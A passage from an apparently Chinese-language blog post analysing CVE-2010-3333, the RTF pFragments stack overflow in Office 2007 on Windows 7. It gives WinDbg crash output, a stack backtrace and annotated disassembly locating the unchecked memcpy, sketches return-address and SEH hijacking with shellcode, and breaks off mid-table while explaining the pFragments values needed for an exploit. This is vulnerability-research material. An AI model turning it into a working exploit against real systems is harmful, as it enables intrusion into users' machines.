esp</code>指令的地址覆盖<code>返回地址</code>，将<code>Shellcode</code>放置在返回地址的后面，就可以劫持<code>程序执行流</code>，执行任意代码。也可以通过覆盖<code>返回地址</code>之后的<code>SEH异常处理函数</code>的地址，劫持异常处理，获得<code>程序的执行流</code>。这些到后面漏洞利用章节再细细展开。</p><h4 id="2、Win7-amp-Office2007"><a href="#2、Win7-amp-Office2007" class="headerlink" title="2、Win7&amp;Office2007"></a>2、Win7&amp;Office2007</h4><p>&emsp;&emsp;首先打开<code>WINWORD.exe</code>，然后打开<code>WinDbg</code>，Attach上WINWORD.exe的进程，程序会自动中断在<code>ntdll!DbgBreakPoint</code>处，<code>g</code>运行程序，然后打开<code>CVE-2010-3333(target6,Crash).rtf</code>文件，程序会中断在<code>MSO.dll</code>的<code>0x32cf3814</code>处，此处就是<code>触发异常</code>的指令：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 3bd10000 3bea5000   C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\OFFICE12\OGL.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 3fd00000 3fd0d000   C:\Windows\system32\WTSAPI32.DLL</span><br><span class="line">(d9c.4a8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=3c524228 <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0011fdfc <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=066a55e0 <span class="built_in">edi</span>=0011ffb8</span><br><span class="line"><span class="built_in">eip</span>=32cf3814 <span class="built_in">esp</span>=0011fdb0 <span class="built_in">ebp</span>=0011fdb0 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office12\mso.dll - </span><br><span class="line">mso!Ordinal7356+<span class="number">0x1315</span>:</span><br><span class="line">32cf3814 8b4804          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">4</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:3c52422c=????????</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address 3c52422c              </span><br><span class="line">Failed to map Heaps (error <span class="number">80004005</span>)</span><br><span class="line"><span class="symbol">Usage:</span>                  Free</span><br><span class="line">Base Address:           3c413000</span><br><span class="line">End Address:            3fd00000</span><br><span class="line">Region Size:            038ed000</span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00000000</span>    </span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00010000</span>    MEM_FREE</span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000001</span>    PAGE_NOACCESS</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们通过<code>!address</code>命令查看触发异常的指令<code>mov ecx,dword ptr [eax+4]</code>所访问的内存地址<code>0x3c52422c</code>的相关信息，可以发现此地址是不具有访问权限的(<code>PAGE_NOACCESS</code>)。然后，我们需要追踪<code>数据流</code>。首先查看<code>栈回溯</code>:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">0011fdb0 32e5944d 0011fdc4 <span class="number">41306141</span> <span class="number">05000000</span> mso!Ordinal7356+<span class="number">0x1315</span>(32cf3814当前指令地址)</span><br><span class="line">             ↑------------------------------------------↓</span><br><span class="line">0011fdcc 32e595bf <span class="number">41306141</span> <span class="number">41386141</span> 0011fdfc mso!Ordinal2605+<span class="number">0x326e</span>(32e5944d)[mso!Ordinal7356+<span class="number">0x1308</span> (32cf3807)的返回地址]</span><br><span class="line">             ↑------------------------------------------↓</span><br><span class="line">0011fe04 <span class="number">37614136</span> <span class="number">41386141</span> <span class="number">62413961</span> <span class="number">31624130</span> mso!Ordinal2605+<span class="number">0x33e0</span>(32e595bf)[mso!Ordinal2605+<span class="number">0x323c</span> (32e5941b)的返回地址]</span><br><span class="line">0011fe08 <span class="number">41386141</span> <span class="number">62413961</span> <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">0x37614136</span></span><br><span class="line">0011fe0c <span class="number">62413961</span> <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">62413362</span> <span class="number">0x41386141</span></span><br><span class="line">0011fe10 <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">62413362</span> <span class="number">35624134</span> <span class="number">0x62413961</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;触发异常的指令(<code>0x32cf3814</code>)所在函数是<code>sub_32CF3807</code>，其父函数为<code>sub_32E5941B</code>，由于栈已被破坏，所以无法再回溯。通过IDA及<code>sub_32E5941B的返回地址</code>(0x32e595bf)，我们可以知道，<code>sub_32E5941B</code>的父函数是<code>sub_32E5955E</code>。通过对这几个函数详细分析，得到的结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    char __userpurge sub_32E5955E@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>32E5955E                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe34 </span></span><br><span class="line"><span class="symbol">.text:</span>32E5955F                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fe04 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59561                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">14h</span>                 <span class="comment">;   esp = esp-0x14 = 0x0011fe04-0x14 = 0x0011fdf0 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59564                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_10], <span class="number">0</span>          <span class="comment">;   [ebp+0x18] = [0x0011fe04+0x18] = [0x0011fe1c] = 0x02360818(a6)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59568                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E59569                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                 <span class="comment">;   edi = eax = 0x0011ffb8(a1)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5956B                 <span class="keyword">jnz</span>     short loc_32E5957E       <span class="comment">;   不为零，跳转，这里跳转</span></span><br><span class="line">......                          </span><br><span class="line"><span class="symbol">.text:</span>32E5957E                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">edi</span>+<span class="number">8</span>]             <span class="comment">;   ecx = [edi+8] = [0x0011ffb8+8] = [0x0011ffc0] = 0x001200d8</span></span><br><span class="line"><span class="symbol">.text:</span>32E59581                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                      <span class="comment">;   ebx = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59582                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59583                 <span class="keyword">call</span>    sub_327A2549             <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>32E59588                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]              <span class="comment">; arg3: [ebp+0xc] = [0x0011fe04+0xc] = [0x0011fe10] = 0x00000000(a3)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5958B                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">64h</span>]           <span class="comment">;   esi = [eax+0x64] = [0x001201ac+0x64] = [0x00120210] = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5958E                 <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_8], <span class="number">0</span>           <span class="comment">;   [ebp-8] = [0x0011fe04-0x8] = [0x0011fdfc] = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E59592                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]               <span class="comment">;   eax = [esi] = [0x066a55e0] = 0x32a0c8c4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59594                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]        <span class="comment">;   ecx = ebp-0x10 = 0x0011fe04-0x10 = 0x0011fdf4 &lt;----(5)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59597                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">; arg2: ecx = 0x0011fdf4(目的地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59598                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="number">5000000h</span>            <span class="comment">;   ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E5959D                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">; arg1: esi = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5959E                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">ebx</span>         <span class="comment">;   [ebp-0xc] = [0x0011fe04-0xc] = [0x0011fdf8] = ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E595A1                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>]      <span class="comment">; [eax+0x1c] = [0x32a0c8c4+0x1c] = [0x32a0c8e0] = 0x327c002c(虚函数地址) &lt;----(6)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>327C002C                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C002D                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fdd0 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C002F                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+Dst], <span class="number">0</span>             <span class="comment">;   [ebp+Dst] = [0x0011fdd0+0xc] = [0x0011fddc] = 0x0011fdf4(a2)(目的地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0033                 <span class="keyword">jz</span>      short loc_327C0054       <span class="comment">;   等于0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0035                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   ecx = [ebp+8] = [0x0011fdd0+8] = [0x0011fdd8] = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0038                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>+<span class="number">0Ch</span>]           <span class="comment">;   eax = [ecx+0xc] = [0x066a55e0+0xc] = [0x066a55ec] = 0x0004c8ac(成员变量，复制数据长度)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C003B                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="number">0FFFFh</span>              <span class="comment">;   eax = eax &amp; 0xFFFF = 0x0004c8ac&amp;0xFFFF = 0xc8ac</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0040                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Size   ; arg3复制数据长度: eax = 0xc8ac</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0041                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_8]         <span class="comment">;   eax = eax*[0x0011fdd0+0x10] = 0xc8ac*0x0 = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0045                 <span class="keyword">add</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>+<span class="number">10h</span>]           <span class="comment">;   eax = eax+[0x066a55e0+0x10] = 0x0+0x1d400000 = 0x1d400000</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0048                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Src    ; arg2源地址: eax = 0x1d400000</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0049                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+Dst]       <span class="comment">; Dst    ; arg1目的地址: [ebp+0xc] = [0x0011fdd0+0xc] = [0x0011fddc] = 0x0011fdf4(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C004C                 <span class="keyword">call</span>    memcpy                   <span class="comment">; 0x0012c6a0 - 0x0011fdf4 = 0xc8ac未出现非法内存访问,栈已被破坏</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0051                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span>                 <span class="comment">;   esp = esp+0xc = 0x0011fdc4+0xc = 0x0011fdd0 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C0054                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0055                 <span class="keyword">retn</span>    <span class="number">0Ch</span>                      <span class="comment">;   esp -&gt; 0x32e595a4(返回地址) </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>32E595A4                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]         <span class="comment">;   eax = [ebp+0x14] = [0x0011fe18] = 0x41326241(a5)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595A7                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]             <span class="comment">; arg4: [ebp+0x18] = [0x0011fe1c] = 0x62413362(a6)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AA                 <span class="keyword">neg</span>     <span class="built_in">eax</span>                      <span class="comment">;   按位取反再加1，eax = 0xbecd9dbf</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AC                 <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   带借位减法,eax = eax-eax-cf = 0xffffffff</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AE                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_8]         <span class="comment">;   ecx = ebp-8 = 0x0011fe04-8 = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">.text:</span>32E595B1                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>                 <span class="comment">;   eax = eax&amp;ecx = 0x0011fdfc</span></span><br><span class="line"><span class="symbol">.text:</span>32E595B3                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg3: eax = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">.text:</span>32E595B4                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg2: [ebp+8] = [0x0011fe04+8] = [0x0011fe0c] = 0x41386141(a2)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595B7                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+var_10]             <span class="comment">; arg1: [ebp-0x10] = [0x0011fe04-0x10] = [0x0011fdf4] = 0x41306141(pFragments属性起始数据) &lt;----(4)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595BA                 <span class="keyword">call</span>    sub_32E5941B             <span class="comment">;</span></span><br><span class="line"><span class="symbol">.text:</span>32E595BF                 <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ****************************************************************************************</span><br><span class="line"></span><br><span class="line">        char __userpurge sub_32E5941B@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">edi</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line"></span><br><span class="line">    ****************************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>32E5941B                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941C                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fdcc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941E                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941F                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E59420                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                      <span class="comment">;   ebx = 0x05000000 </span></span><br><span class="line"><span class="symbol">    .text:</span>32E59421                 <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                 <span class="comment">;   ebx = ebx^ebx = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59423                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_C], <span class="built_in">ebx</span>         <span class="comment">;   [ebp+0x14] = [0x0011fdcc+0x14] = [0x0011fde0] = 0x62413362(a5)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59426                 <span class="keyword">jnz</span>     short loc_32E59439       <span class="comment">;   不为零跳转，这里跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59428                 <span class="keyword">push</span>    <span class="number">33757061h</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5942D                 <span class="keyword">call</span>    sub_32E6AEA8</span><br><span class="line"><span class="symbol">    .text:</span>32E59432</span><br><span class="line"><span class="symbol">    .text:</span>32E59432 loc_32E59432:                          </span><br><span class="line"><span class="symbol">    .text:</span>32E59432                 <span class="keyword">xor</span>     <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59434</span><br><span class="line"><span class="symbol">    .text:</span>32E59434 loc_32E59434:                          </span><br><span class="line"><span class="symbol">    .text:</span>32E59434                 <span class="keyword">pop</span>     <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59435                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59436                 <span class="keyword">retn</span>    <span class="number">10h</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59439 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59439</span><br><span class="line"><span class="symbol">    .text:</span>32E59439 loc_32E59439:                           </span><br><span class="line"><span class="symbol">    .text:</span>32E59439                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_0], <span class="built_in">ebx</span>         <span class="comment">;   [ebp+0x8] = [0x0011fdcc+0x8] = [0x0011fdd4] = 0x41306141(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5943C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_8], <span class="built_in">ebx</span>         <span class="comment">;   [ebp-8] = [0x0011fdcc-8] = [0x0011fdc4] = 0x0011fdfc</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5943F                 <span class="keyword">jz</span>      short loc_32E59451       <span class="comment">;   等于0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59441                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg2: [ebp+8] = [0x0011fdcc+8] = [0x0011fdd4] = 0x41306141(a2) &lt;----(3)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59444                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]         <span class="comment">;   eax = ebp-8 = 0x0011fdc4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59447                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x0011fdc4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59448                 <span class="keyword">call</span>    sub_32CF3807             <span class="comment">; </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5944D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        **************************************************</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> __stdcall sub_32CF3807(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">        **************************************************</span><br><span class="line"><span class="symbol">        .text:</span>32CF3807                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">; ebp = 0x0011fdcc</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3808                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">; ebp = esp = 0x0011fdb0</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF380A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]         <span class="comment">; eax = [0x0011fdb0+0xc] = [0x0011fdbc] = 0x41306141(a2) &lt;----(2)</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF380D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, loc_32CF3820[<span class="built_in">eax</span>*<span class="number">8</span>] <span class="comment">; eax = eax*8+0x32CF3820 = 0x3c524228 </span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3814                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">4</span>]             <span class="comment">; ecx = [0x3c524228+4] = [0x3c52422c] = ???????? 不可访问 &lt;----(1)</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3817                 <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFh</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF381D                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF381E                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="symbol">        .text:</span>32CF3820 loc_32CF3820:                           <span class="comment">; DATA XREF: sub_32CF3807+6↑o</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3820                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">        .text:</span>32CF3823                 <span class="keyword">call</span>    sub_326CC86E</span><br><span class="line"><span class="symbol">        .text:</span>32CF3828                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3829                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据以上结果，我们可以知道，<code>此异常</code>是因为<code>栈上的数据</code>已经<code>被破坏</code>了之后，<code>重新读取</code>被破坏区域的栈数据，计算出一个<code>不可访问的地址</code>，并对其进行<code>读取</code>，造成<code>非法内存访问</code>。在函数<code>sub_32E5955E</code>中，通过<code>0x066a55e0</code>处的<code>对象</code>，调用了<code>虚函数sub_327C002C</code>，在这个虚函数中通过<code>memcpy</code>函数将样本中<code>pFragments属性的值</code>复制到<code>栈</code>上，但并<code>未检查</code>其复制长度，造成了<code>栈溢出</code>。pFragments属性数据的<code>源地址</code>和<code>复制数据长度</code>都已经解析完成，并保存在<code>0x066a55e0</code>处的<code>对象</code>的<code>成员变量</code>中。pFragments属性数据在<code>栈</code>上的<code>起始地址</code>为<code>0x0011fdf4</code>，而复制数据的长度为<code>0xc8ac</code>，0x0011fdf4+0xc8ac=0x0012c6a0<code>小于0x00130000</code>，所以没像在<code>Windows XP</code>中那样，在复制数据过程中就触发异常，而是在访问被破坏的栈数据后，造成<code>非法内存访问</code>。</p><h3 id="0x33-pFragments属性数据“6-5-”的含义及其合法值"><a href="#0x33-pFragments属性数据“6-5-”的含义及其合法值" class="headerlink" title="0x33 pFragments属性数据“6;5;”的含义及其合法值"></a>0x33 pFragments属性数据“6;5;”的含义及其合法值</h3><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p><p>&emsp;&emsp;这个点，我看网上的分析文章都没有介绍到，也可能有人写了，我没找到。如果没弄清楚这个，就无法成功编写利用程序，我们需要注意每一个细节，才能最终成功利用一个漏洞。</p><p>&emsp;&emsp;在<code>RTF v1.9.1</code>版本的参考文档中(Document Area-&gt;Drawing Objects-&gt;Drawing Object Properties-&gt;Geometry)，是这样介绍的：</p><table><thead><tr><th style="text-align:center">Property</th><th style="text-align:left">Meaning</th><th style="text-align:center">Type of value</th><th style="text-align:center">Default</th></tr></thead><tbody><tr><td style="text-align:center">pFragments</td><td style="text-align:left">Fragments are optional, additional parts to the shape. They allow the shape to contain multiple paths and parts. This property lists the fragments of the shape.</td><td style="text-align:center">Array</td><td 